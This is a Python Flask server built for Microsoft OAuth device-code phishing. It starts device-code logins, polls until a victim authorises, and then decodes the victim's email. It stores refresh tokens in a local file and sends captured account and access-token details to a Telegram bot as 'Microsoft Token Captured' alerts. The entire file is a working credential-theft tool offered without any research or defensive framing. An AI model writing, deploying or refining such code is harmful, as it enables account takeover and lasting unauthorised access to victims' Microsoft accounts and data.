import os
import time
import uuid
import json
import base64
import requests
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

# ====================== CONFIG ======================
CLIENT_ID = os.getenv("MICROSOFT_CLIENT_ID")
TENANT = os.getenv("MICROSOFT_TENANT_ID", "common")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

TOKENS_FILE = "tokens.json"

# ====================== HELPER FUNCTIONS ======================
def load_stored_tokens():
    if os.path.exists(TOKENS_FILE):
        try:
            with open(TOKENS_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_token_data(email: str, token_data: dict):
    tokens = load_stored_tokens()
    tokens[email] = {
        "refresh_token": token_data.get("refresh_token"),
        "last_captured": time.time(),
        "name": token_data.get("name", "Unknown"),
        "expires_in": token_data.get("expires_in")
    }
    with open(TOKENS_FILE, "w") as f:
        json.dump(tokens, f, indent=2)

def get_email_from_id_token(id_token: str):
    try:
        payload = id_token.split('.')[1]
        payload += '=' * (4 - len(payload) % 4)
        decoded = base64.b64decode(payload).decode('utf-8')
        data = json.loads(decoded)
        return data.get("preferred_username") or data.get("email") or data.get("upn") or "unknown-account"
    except:
        return "unknown-account"

def send_to_telegram(token_data: dict, email: str):
    if not (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID):
        return
    try:
        access = token_data.get("access_token", "")[:50] + "..."
        refresh_info = "Refresh token received" if token_data.get("refresh_token") else "No refresh token"
        
        message = f"""🔑 <b>Microsoft Token Captured</b>

Account: <code>{email}</code>
Access Token: <code>{access}</code>
{refresh_info}
Expires in: {token_data.get('expires_in', 'N/A')} seconds
"""
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        })
    except:
        pass

# ====================== ROUTES ======================
@app.route("/")
def index():
    return send_from_directory(".", "index.html")

@app.route("/api/start", methods=["POST"])
def start_flow():
    if not CLIENT_ID:
        return jsonify({"success": False, "error": "Client ID not set"}), 400

    flow_id = str(uuid.uuid4())

    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
    payload = {
        "client_id": CLIENT_ID,
        "scope": "https://graph.microsoft.com/.default offline_access openid profile email"
    }

    resp = requests.post(url, data=payload, timeout=15)
    device_data = resp.json()

    app.active_flows[flow_id] = {
        "device_code": device_data["device_code"],
        "user_code": device_data["user_code"],
        "interval": device_data.get("interval", 5),
        "expires_at": time.time() + device_data.get("expires_in", 900)
    }

    return jsonify({
        "success": True,
        "flow_id": flow_id,
        "user_code": device_data["user_code"]
    })

@app.route("/api/status/<flow_id>")
def check_status(flow_id):
    flow = app.active_flows.get(flow_id)
    if not flow:
        return jsonify({"status": "error", "error": "Flow not found"}), 404

    if time.time() > flow["expires_at"]:
        return jsonify({"status": "error", "error": "Expired"}), 410

    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": flow["device_code"]
    }

    try:
        resp = requests.post(url, data=payload, timeout=15)
        result = resp.json()

        if "access_token" in result:
            email = "unknown"
            if result.get("id_token"):
                email = get_email_from_id_token(result["id_token"])
            
            save_token_data(email, result)
            send_to_telegram(result, email)
            
            flow["token"] = result
            return jsonify({"status": "success"})
        
        elif result.get("error") == "authorization_pending":
            return jsonify({"status": "pending"})
        else:
            return jsonify({"status": "error", "error": result.get("error_description", "Unknown")})
    except Exception:
        return jsonify({"status": "error", "error": "Poll error"})

app.active_flows = {}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
